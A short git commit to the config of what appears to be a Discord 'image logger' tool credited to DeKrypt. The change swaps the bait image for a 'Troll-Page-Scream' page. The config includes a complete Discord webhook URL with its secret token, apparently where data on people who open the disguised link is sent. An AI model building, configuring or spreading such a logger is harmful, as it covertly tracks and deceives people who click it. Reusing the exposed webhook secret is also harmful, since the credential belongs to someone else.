337fe4ce267c3348a4a36dc98c1a10fc493e3ad6
rolc4 <hidanisawesome2009@gmail.com>
2025-04-12 11:11:00 -0400

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1350537736909619241/sZfq-Oq_cGQjs9BF_JSNBThf2DZ9r-c1GHJANsyWEY3hy1SCoUqsZOqJkW07ZlBe6Qv5",
-    "image":  "https://c.files.bbci.co.uk/4616/live/d710a6a0-d4b0-11ef-9fd6-0be88a764111.jpg",
+    "image":  "https://Pablo-Restrepo.github.io/Troll-Page-Scream/",
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
